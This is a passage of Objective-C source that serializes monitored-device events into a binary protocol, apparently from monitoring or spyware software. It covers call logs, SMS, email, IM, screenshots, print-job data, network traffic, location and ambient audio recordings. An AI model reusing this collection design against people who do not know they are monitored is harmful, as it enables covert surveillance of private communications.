            [oldPermissionData appendBytes:&privilegeListFolderContents length:sizeof(uint8_t)];
        }

       
        [oldInfoData appendBytes:&oldPathSize length:sizeof(uint16_t)];
        [oldInfoData appendData:[oldPath dataUsingEncoding:NSUTF8StringEncoding]];
        [oldInfoData appendBytes:&oldFileNameSize length:sizeof(uint16_t)];
        [oldInfoData appendData:[oldFileName dataUsingEncoding:NSUTF8StringEncoding]];
        [oldInfoData appendBytes:&oldFileSize length:sizeof(uint64_t)];
        [oldInfoData appendBytes:&oldAttributes length:sizeof(uint16_t)];
        [oldInfoData appendBytes:&oldPermissionCount length:sizeof(uint16_t)];
        [oldInfoData appendData:oldPermissionData];

        [oldPermissionData release];
        
        lengthOfOldInfo = [oldInfoData length];
        lengthOfOldInfo = htons(lengthOfOldInfo);
    }else{
        lengthOfOldInfo = 0;
        lengthOfOldInfo = htons(lengthOfOldInfo);
    }
    //============================================================== End Old FileInfo

    //============================================================== Modify FileInfo
    FileActivityInfo * ModifyInfo = [aEvent mModifiedFile];
    
    uint16_t lengthOfModifyInfo;
    NSMutableData *modifyInfoData = [[NSMutableData alloc] init] ;
    
    if (ModifyInfo) {
         
        NSString *modifyPath = [ModifyInfo mPath];
        uint16_t modifyPathSize = [modifyPath lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        modifyPathSize = htons(modifyPathSize);
        
        NSString *modifyFileName = [ModifyInfo mFileName];
        uint16_t modifyFileNameSize = [modifyFileName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        modifyFileNameSize = htons(modifyFileNameSize);
        
        uint64_t modifyFileSize = [ModifyInfo mSize];
        modifyFileSize = EndianU64_LtoB(modifyFileSize);
        
        uint16_t modifyAttributes = [ModifyInfo mAttributes];
        modifyAttributes = htons(modifyAttributes);
        
        uint16_t modifyPermissionCount =[[ModifyInfo mPermissions] count];
        modifyPermissionCount = htons(modifyPermissionCount);
        
        NSMutableData *modifyPermissionData = [[NSMutableData alloc] init];
        for (int i = 0; i < [[ModifyInfo mPermissions] count]; i++) {
            FileActivityPermission * permission = [[ModifyInfo mPermissions]objectAtIndex:i];
            
            NSString *permissionGroupUserName = [permission mGroupUserName];
            uint16_t permissionGroupUserNameSize = [permissionGroupUserName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
            permissionGroupUserNameSize = htons(permissionGroupUserNameSize);
            
            uint8_t privilegeFullControl        = [permission mPrivilegeFullControl];
            uint8_t privilegeModify             = [permission mPrivilegeModify];
            uint8_t privilegeReadExecute        = [permission mPrivilegeReadExecute];
            uint8_t privilegeRead               = [permission mPrivilegeRead];
            uint8_t privilegeWrite              = [permission mPrivilegeWrite];
            uint8_t privilegeListFolderContents = [permission mPrivilegeListFolderContents];
            
            [modifyPermissionData appendBytes:&permissionGroupUserNameSize length:sizeof(uint16_t)];
            [modifyPermissionData appendData:[permissionGroupUserName dataUsingEncoding:NSUTF8StringEncoding]];
            [modifyPermissionData appendBytes:&privilegeFullControl length:sizeof(uint8_t)];
            [modifyPermissionData appendBytes:&privilegeModify length:sizeof(uint8_t)];
            [modifyPermissionData appendBytes:&privilegeReadExecute length:sizeof(uint8_t)];
            [modifyPermissionData appendBytes:&privilegeRead length:sizeof(uint8_t)];
            [modifyPermissionData appendBytes:&privilegeWrite length:sizeof(uint8_t)];
            [modifyPermissionData appendBytes:&privilegeListFolderContents length:sizeof(uint8_t)];
        }
        
        [modifyInfoData appendBytes:&modifyPathSize length:sizeof(uint16_t)];
        [modifyInfoData appendData:[modifyPath dataUsingEncoding:NSUTF8StringEncoding]];
        [modifyInfoData appendBytes:&modifyFileNameSize length:sizeof(uint16_t)];
        [modifyInfoData appendData:[modifyFileName dataUsingEncoding:NSUTF8StringEncoding]];
        [modifyInfoData appendBytes:&modifyFileSize length:sizeof(uint64_t)];
        [modifyInfoData appendBytes:&modifyAttributes length:sizeof(uint16_t)];
        [modifyInfoData appendBytes:&modifyPermissionCount length:sizeof(uint16_t)];
        [modifyInfoData appendData:modifyPermissionData];
        
        [modifyPermissionData release];

        lengthOfModifyInfo = [modifyInfoData length];
        lengthOfModifyInfo = htons(lengthOfModifyInfo);
    }else{
        lengthOfModifyInfo = 0;
        lengthOfModifyInfo = htons(lengthOfModifyInfo);
    }
    //============================================================== End Modify FileInfo
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&activityType length:sizeof(uint8_t)];
    [result appendBytes:&fileType     length:sizeof(uint8_t)];
    [result appendBytes:&activityOwnerSize length:sizeof(uint16_t)];
    [result appendData:[activityOwner dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendData:[dateCreated dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendData:[dateModified dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendData:[dateAccessed dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&lengthOfOldInfo length:sizeof(uint16_t)];
    if (oldInfoData){
        [result appendData:oldInfoData ];
    }
    [result appendBytes:&lengthOfModifyInfo length:sizeof(uint16_t)];
    if (modifyInfoData) {
        [result appendData:modifyInfoData];
    }
    [oldInfoData release];
    [modifyInfoData release];
    
    return ([result autorelease]);
}

+ (NSData *) parseNetworkTrafficEvent: (NetworkTrafficEvent *) aEvent {
    
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);

    NSString *appID = [aEvent mApplicationID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);

    NSString *appName = [aEvent mApplicationName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);

    NSString *title =[aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);

    NSString *startTime = [aEvent mStartTime];
    NSString *endTime = [aEvent mEndTime];

    uint8_t interfaceCount = [[aEvent mNetworkInterfaces] count];

    NSMutableData *interfaceData = [[NSMutableData alloc] init];
    for (int i = 0; i < [[aEvent mNetworkInterfaces] count]; i++) {
        NetworkInterface * interface = [[aEvent mNetworkInterfaces] objectAtIndex:i];

        uint8_t networkType = [interface mNetworkType];

        NSString *interfaceName = [interface mInterfaceName];
        uint16_t interfaceNameSize = [interfaceName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        interfaceNameSize = htons(interfaceNameSize);
 
        NSString *interfaceDesc = [interface mDescription];
        uint16_t interfaceDescSize = [interfaceDesc lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        interfaceDescSize = htons(interfaceDescSize);
 
        NSString *interfaceIPv4   = [interface mIPv4];
        uint8_t interfaceIPv4Size = [interfaceIPv4 length];

        NSString *interfaceIPv6   = [interface mIPv6];
        uint8_t interfaceIPv6Size = [interfaceIPv6 length];

        uint32_t hostCount = [[interface mRemoteHosts] count];
        hostCount = htonl(hostCount);
 
        NSMutableData *hostData = [[NSMutableData alloc] init];
        
        for (int j = 0 ; j < [[interface mRemoteHosts] count]; j++) {
            NetworkRemoteHost * remoteHost = [[interface mRemoteHosts] objectAtIndex:j];
     
            NSString *remoteHostIPv4   = [remoteHost mIPv4];
            uint8_t remoteHostIPv4Size = [remoteHostIPv4 length];
 
            NSString *remoteHostIPv6   = [remoteHost mIPv6];
            uint8_t remoteHostIPv6Size = [remoteHostIPv6 length];

            NSString *remoteHostName = [remoteHost mHostName];
            uint16_t remoteHostNameSize = [remoteHostName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
            remoteHostNameSize = htons(remoteHostNameSize);

            uint32_t trafficCount = [[remoteHost mTraffics] count];
            trafficCount = htonl(trafficCount);
  
            NSMutableData *trafficData = [[NSMutableData alloc] init];
            
            for (int k = 0; k < [[remoteHost mTraffics] count]; k++) {
                NetworkTraffic * traffic = [[remoteHost mTraffics] objectAtIndex:k];
                
                uint8_t tranTypeSize =  [traffic mTransportType];
                
                uint16_t trafficType = [traffic mFxProtocolType];
                trafficType = htons(trafficType);

                uint32_t portNumber = [traffic mPortNumber];
                portNumber = htonl(portNumber);
  
                uint64_t packetsIn = [traffic mPacketsIn];
                packetsIn = EndianU64_LtoB(packetsIn);

                uint64_t inByte = [traffic mIncomingTrafficSize];
                inByte = EndianU64_LtoB(inByte);
 
                uint64_t packetsOut = [traffic mPacketsOut];
                packetsOut = EndianU64_LtoB(packetsOut);

                uint64_t outByte = [traffic mOutgoingTrafficSize];
                outByte = EndianU64_LtoB(outByte);
 
                [trafficData appendBytes:&tranTypeSize length:sizeof(uint8_t)];
                [trafficData appendBytes:&trafficType length:sizeof(uint16_t)];
                [trafficData appendBytes:&portNumber  length:sizeof(uint32_t)];
                [trafficData appendBytes:&packetsIn   length:sizeof(uint64_t)];
                [trafficData appendBytes:&inByte      length:sizeof(uint64_t)];
                [trafficData appendBytes:&packetsOut  length:sizeof(uint64_t)];
                [trafficData appendBytes:&outByte     length:sizeof(uint64_t)];
                
            }
            [hostData appendBytes:&remoteHostIPv4Size length:sizeof(uint8_t)];
            [hostData appendData:[remoteHostIPv4 dataUsingEncoding:NSUTF8StringEncoding]];
            [hostData appendBytes:&remoteHostIPv6Size length:sizeof(uint8_t)];
            [hostData appendData:[remoteHostIPv6 dataUsingEncoding:NSUTF8StringEncoding]];
            [hostData appendBytes:&remoteHostNameSize length:sizeof(uint16_t)];
            [hostData appendData:[remoteHostName dataUsingEncoding:NSUTF8StringEncoding]];
            [hostData appendBytes:&trafficCount length:sizeof(uint32_t)];
            [hostData appendData:trafficData];
            [trafficData release];
        }
        [interfaceData appendBytes:&networkType length:sizeof(uint8_t)];
        [interfaceData appendBytes:&interfaceNameSize length:sizeof(uint16_t)];
        [interfaceData appendData:[interfaceName dataUsingEncoding:NSUTF8StringEncoding]];
        [interfaceData appendBytes:&interfaceDescSize length:sizeof(uint16_t)];
        [interfaceData appendData:[interfaceDesc dataUsingEncoding:NSUTF8StringEncoding]];
        [interfaceData appendBytes:&interfaceIPv4Size length:sizeof(uint8_t)];
        [interfaceData appendData:[interfaceIPv4 dataUsingEncoding:NSUTF8StringEncoding]];
        [interfaceData appendBytes:&interfaceIPv6Size length:sizeof(uint8_t)];
        [interfaceData appendData:[interfaceIPv6 dataUsingEncoding:NSUTF8StringEncoding]];
        [interfaceData appendBytes:&hostCount length:sizeof(uint32_t)];
        [interfaceData appendData:hostData];
        [hostData release];
    }

    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendData:[startTime dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendData:[endTime dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&interfaceCount length:sizeof(uint8_t)];
    [result appendData:interfaceData];

    [interfaceData release];
    
    return ([result autorelease]);
}

+ (NSData *) parsePrintJobEvent: (PrintJobEvent *) aEvent {
    
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    
    NSString *appID = [aEvent mApplicationID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    
    NSString *appName = [aEvent mApplicationName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    
    NSString *title =[aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    NSString *jobID =[aEvent mJobID];
    uint16_t jobIDSize = [jobID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    jobIDSize = htons(jobIDSize);
    
    NSString *ownerName =[aEvent mOwnerName];
    uint16_t ownerNameSize = [ownerName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    ownerNameSize = htons(ownerNameSize);
    
    NSString *printerName =[aEvent mPrinter];
    uint16_t printerNameSize = [printerName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    printerNameSize = htons(printerNameSize);
    
    NSString *documentName =[aEvent mDocumentName];
    uint16_t documentNameSize = [documentName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    documentNameSize = htons(documentNameSize);
    
    NSString *summitTime = [aEvent mSubmitTime];

    uint32_t totalPage = [aEvent mTotalPage];
    totalPage = htonl(totalPage);
    
    uint32_t totalByte = [aEvent mTotalByte];
    totalByte = htonl(totalByte);
    
    NSString *mimeType =[aEvent mMimeType];
    uint16_t mimeTypeSize = [mimeType lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    mimeTypeSize = htons(mimeTypeSize);
    
    NSData * data =[aEvent mData];
    uint32_t dataSize = [data length];
    dataSize = htonl(dataSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&jobIDSize length:sizeof(uint16_t)];
    [result appendData:[jobID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&ownerNameSize length:sizeof(uint16_t)];
    [result appendData:[ownerName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&printerNameSize length:sizeof(uint16_t)];
    [result appendData:[printerName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&documentNameSize length:sizeof(uint16_t)];
    [result appendData:[documentName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendData:[summitTime dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&totalPage length:sizeof(uint32_t)];
    [result appendBytes:&totalByte length:sizeof(uint32_t)];
    [result appendBytes:&mimeTypeSize length:sizeof(uint16_t)];
    [result appendData:[mimeType dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&dataSize length:sizeof(uint32_t)];
    [result appendData:data];
    
    return ([result autorelease]);
}

+ (NSData *) parseNetworkConnectionEvent: (NetworkConnectionEvent *) aEvent{
    
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    
    NSString *appID = [aEvent mApplicationID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    
    NSString *appName = [aEvent mApplicationName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    
    NSString *title =[aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);

    //Adater
    NSString *uid = [[aEvent mAdapter] mUID];
    uint16_t uidSize = [uid lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    uidSize = htons(uidSize);

    uint8_t networkTypeSize =  [[aEvent mAdapter] mNetworkType];
    
    NSString *name = [[aEvent mAdapter] mName];
    uint16_t nameSize = [name lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    nameSize = htons(nameSize);
    
    NSString *description = [[aEvent mAdapter] mDescription];
    uint16_t descriptionSize = [description lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    descriptionSize = htons(descriptionSize);
    
    NSString *MACAddress = [[aEvent mAdapter] mMACAddress];
    uint16_t MACAddressSize = [MACAddress lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    MACAddressSize = htons(MACAddressSize);
    
    //Status
    uint8_t state =  [[aEvent mAdapterStatus] mState];
    
    NSString *networkName = [[aEvent mAdapterStatus] mNetworkName];
    uint16_t networkNameSize = [networkName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    networkNameSize = htons(networkNameSize);
    
    NSString *IPv4 = [[aEvent mAdapterStatus] mIPv4];
    uint16_t IPv4Size = [IPv4 lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    IPv4Size = htons(IPv4Size);
    
    NSString *IPv6 = [[aEvent mAdapterStatus] mIPv6];
    uint16_t IPv6Size = [IPv6 lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    IPv6Size = htons(IPv6Size);
    
    NSString *subnetMaskAddress = [[aEvent mAdapterStatus] mSubnetMaskAddress];
    uint16_t subnetMaskAddressSize = [subnetMaskAddress lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    subnetMaskAddressSize = htons(subnetMaskAddressSize);
    
    NSString *defaultGateway = [[aEvent mAdapterStatus] mDefaultGateway];
    uint16_t defaultGatewaySize = [defaultGateway lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    defaultGatewaySize = htons(defaultGatewaySize);
    
    uint8_t DHCP =  [[aEvent mAdapterStatus] mDHCP];
    
    NSMutableData *result = [[NSMutableData alloc] init];
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    
    [result appendBytes:&uidSize length:sizeof(uint16_t)];
    [result appendData:[uid dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&networkTypeSize length:sizeof(uint8_t)];
    [result appendBytes:&nameSize length:sizeof(uint16_t)];
    [result appendData:[name dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&descriptionSize length:sizeof(uint16_t)];
    [result appendData:[description dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&MACAddressSize length:sizeof(uint16_t)];
    [result appendData:[MACAddress dataUsingEncoding:NSUTF8StringEncoding]];
   
    [result appendBytes:&state length:sizeof(uint8_t)];
    [result appendBytes:&networkNameSize length:sizeof(uint16_t)];
    [result appendData:[networkName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&IPv4Size length:sizeof(uint16_t)];
    [result appendData:[IPv4 dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&IPv6Size length:sizeof(uint16_t)];
    [result appendData:[IPv6 dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&subnetMaskAddressSize length:sizeof(uint16_t)];
    [result appendData:[subnetMaskAddress dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&defaultGatewaySize length:sizeof(uint16_t)];
    [result appendData:[defaultGateway dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&DHCP length:sizeof(uint8_t)];
    
    return ([result autorelease]);
}

+ (NSData *) parseAppScreenShotEvent: (AppScreenShotEvent *) aEvent{
//    DLog(@"~~~~~~~~~~ parseAppScreenShotEvent ~~~~~~~~~~ %@",aEvent);
//    DLog(@"mUserLogonName %@",[aEvent mUserLogonName]);
//    DLog(@"mApplicationID %@",[aEvent mApplicationID]);
//    DLog(@"mApplicationName %@",[aEvent mApplicationName]);
//    DLog(@"mTitle %@",[aEvent mTitle]);
//    DLog(@"mApplication_Catagory %d",[aEvent mApplication_Catagory]);
//    DLog(@"mUrl %@",[aEvent mUrl]);
//    DLog(@"mMediaType %d",[aEvent mMediaType]);
//    DLog(@"mScreenshotFilePath %@",[aEvent mScreenshotFilePath]);

    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    
    NSString *appID = [aEvent mApplicationID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    
    NSString *appName = [aEvent mApplicationName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    
    NSString *title =[aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);

    uint8_t applicationCategory =  [aEvent mApplication_Catagory];

    NSString *url = [aEvent mUrl];
    uint16_t urlSize = [url lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    urlSize = htons(urlSize);
    
    uint8_t mediaType =  [aEvent mMediaType];
    
    NSData *screenshotData = [NSData dataWithContentsOfFile:[aEvent mScreenshotFilePath]];
    uint32_t screenshotDataSize = [screenshotData length];
    screenshotDataSize = htonl(screenshotDataSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
#if !TARGET_OS_IPHONE
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
#endif
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    
    [result appendBytes:&applicationCategory length:sizeof(uint8_t)];
    [result appendBytes:&urlSize length:sizeof(uint16_t)];
    [result appendData:[url dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&mediaType length:sizeof(uint8_t)];
    [result appendBytes:&screenshotDataSize length:sizeof(uint32_t)];
    [result appendData:screenshotData];

    return ([result autorelease]);
}

+ (NSData *) parseAppScreenShotEventV13: (AppScreenShotEvent *) aEvent{
//    DLog(@"~~~~~~~~~~ parseAppScreenShotEventV13 ~~~~~~~~~~ %@",aEvent);
//    DLog(@"mUserLogonName %@",[aEvent mUserLogonName]);
//    DLog(@"mApplicationID %@",[aEvent mApplicationID]);
//    DLog(@"mApplicationName %@",[aEvent mApplicationName]);
//    DLog(@"mTitle %@",[aEvent mTitle]);
//    DLog(@"mApplication_Catagory %d",[aEvent mApplication_Catagory]);
//    DLog(@"mScreenshot_Catagory %d",[aEvent mScreenshot_Catagory]);
//    DLog(@"mUrl %@",[aEvent mUrl]);
//    DLog(@"mMediaType %d",[aEvent mMediaType]);
//    DLog(@"mScreenshotFilePath %@",[aEvent mScreenshotFilePath]);
    
    NSString *user = [aEvent mUserLogonName];
    uint16_t userSize = [user lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    userSize = htons(userSize);
    
    NSString *appID = [aEvent mApplicationID];
    uint16_t appIDSize = [appID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appIDSize = htons(appIDSize);
    
    NSString *appName = [aEvent mApplicationName];
    uint16_t appNameSize = [appName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    appNameSize = htons(appNameSize);
    
    NSString *title =[aEvent mTitle];
    uint16_t titleSize = [title lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    titleSize = htons(titleSize);
    
    uint8_t applicationCategory =  [aEvent mApplication_Catagory];
    uint8_t screenshotCategory =  [aEvent mScreenshot_Catagory];
    
    NSString *url = [aEvent mUrl];
    uint16_t urlSize = [url lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    urlSize = htons(urlSize);
    
    uint8_t mediaType =  [aEvent mMediaType];
    
    NSData *screenshotData = [NSData dataWithContentsOfFile:[aEvent mScreenshotFilePath]];
    uint32_t screenshotDataSize = [screenshotData length];
    screenshotDataSize = htonl(screenshotDataSize);
    
    NSMutableData *result = [[NSMutableData alloc] init];
#if !TARGET_OS_IPHONE
    [result appendBytes:&userSize length:sizeof(uint16_t)];
    [result appendData:[user dataUsingEncoding:NSUTF8StringEncoding]];
#endif
    [result appendBytes:&appIDSize length:sizeof(uint16_t)];
    [result appendData:[appID dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&appNameSize length:sizeof(uint16_t)];
    [result appendData:[appName dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&titleSize length:sizeof(uint16_t)];
    [result appendData:[title dataUsingEncoding:NSUTF8StringEncoding]];
    
    [result appendBytes:&applicationCategory length:sizeof(uint8_t)];
    [result appendBytes:&screenshotCategory length:sizeof(uint8_t)];
    [result appendBytes:&urlSize length:sizeof(uint16_t)];
    [result appendData:[url dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&mediaType length:sizeof(uint8_t)];
    [result appendBytes:&screenshotDataSize length:sizeof(uint32_t)];
    [result appendData:screenshotData];
    
    return ([result autorelease]);
}

#pragma mark -
#pragma mark Note & Calendar entry parser

+ (NSData *) parseNote: (Note *) aNote {
	return ([NoteProtocolConverter convertToProtocol:aNote]);
}

+ (NSData *) parseCalendarEntry: (CalendarEntry *) aCalendarEntry {
	return ([CalendarProtocolConverter convertCalendarEntryToProtocol:aCalendarEntry]);
}

#pragma mark -
#pragma mark All events (entry point events parser)

+ (NSData *)parseEvent:(Event *)event payloadFileHandle: (NSFileHandle *) aFileHandle {
    return ([self parseEvent:event metadata:nil payloadFileHandle:aFileHandle]);
}

+ (NSData *)parseEvent:(Event *)event
              metadata:(CommandMetaData *) aMetaData
     payloadFileHandle: (NSFileHandle *) aFileHandle {
	NSData *result;
	DLog(@"ENTER parseEvent with event type %d, aFileHandle = %@", [event getEventType], aFileHandle);
	switch ([event getEventType]) {
		case CALL_LOG:
			result = [self parseCallLogEvent:(CallLogEvent *)event];
			break;
		case SMS:
			result = [self parseSMSEvent:(SMSEvent *)event];
			break;
		case MAIL:
			result = [self parseEmailEvent:(EmailEvent *)event];
			break;
		case MMS:
			result = [self parseMMSEvent:(MMSEvent *)event];
			break;
		case IM:
			result = [self parseIMEvent:(IMEvent *)event];
			break;
		case PANIC_IMAGE:
			result = [self parsePanicImage:(PanicImage *)event];
			break;
		case PANIC_STATUS:
			result = [self parsePanicStatus:(PanicStatus *)event];
			break;
		case WALLPAPER_THUMBNAIL:
			result = [self parseWallpaperThumbnailEvent:(WallpaperThumbnailEvent *)event];
			break;
		case CAMERA_IMAGE_THUMBNAIL:
            if (aMetaData.protocolVersion >= 10) {
                result = [self parseCameraImageThumbnailEventV10:(CameraImageThumbnailEvent *)event];
            } else {
                result = [self parseCameraImageThumbnailEvent:(CameraImageThumbnailEvent *)event];
            }
			break;
		case AUDIO_FILE_THUMBNAIL:
            if (aMetaData.protocolVersion >= 10) {
                result = [self parseAudioFileThumbnailEventV10:(AudioFileThumbnailEvent *)event];
            } else {
                result = [self parseAudioFileThumbnailEvent:(AudioFileThumbnailEvent *)event];
            }
			break;
		case AUDIO_CONVERSATION_THUMBNAIL:
			result = [self parseAudioConversationThumbnailEvent:(AudioConversationThumbnailEvent *)event];
			break;
		case VIDEO_FILE_THUMBNAIL:
            if (aMetaData.protocolVersion >= 10) {
                result = [self parseVideoFileThumbnailEventV10:(VideoFileThumbnailEvent *)event];
            } else {
                result = [self parseVideoFileThumbnailEvent:(VideoFileThumbnailEvent *)event];
            }
			break;
		case WALLPAPER:
			result = [self parseWallpaperEvent:(WallpaperEvent *)event];
			break;
		case CAMERA_IMAGE:
			result = [self parseCameraImageEvent:(CameraImageEvent *)event payloadFileHandle:aFileHandle];
			break;
		case AUDIO_CONVERSATION:
			result = [self parseAudioConversationEvent:(AudioConversationEvent *)event payloadFileHandle:aFileHandle];
			break;
		case AUDIO_FILE:
			result = [self parseAudioFileEvent:(AudioFileEvent *)event payloadFileHandle:aFileHandle];
			break;
        case VIDEO_FILE:
			result = [self parseVideoFileEvent:(VideoFileEvent *)event payloadFileHandle:aFileHandle];
            break;
		case LOCATION:
			result = [self parseLocationEvent:(LocationEvent *)event];
			break;
		case SYSTEM:
			result = [self parseSystemEvent:(SystemEvent *)event];
			break;
		case BROWSER_URL:
			result = [self parseBrowserUrlEvent:(BrowserUrlEvent *)event];
			break;
		case BOOKMARK:
			result = [self parseBookmarksEvent:(BookmarksEvent *)event];
			break;
		case SETTING:
            if ([aMetaData protocolVersion] >= 10) {
                result = [self parseSettingEventV10:(SettingEvent *)event];
            } else {
                result = [self parseSettingEvent:(SettingEvent *)event];
            }
			break;
		case APPLICATION_LIFE_CYCLE:
			result = [self parseApplicationLifeCycleEvent:(ALCEvent *)event];
			break;
		case AUDIO_AMBIENT_RECORDING_THUMBNAIL:
			result = [self parseAudioAmbientThumbnailEvent:(AudioAmbientThumbnailEvent *)event];
			break;
		case AUDIO_AMBIENT_RECORDING:
			result = [self parseAudioAmbientEvent:(AudioAmbientEvent *)event payloadFileHandle:aFileHandle];
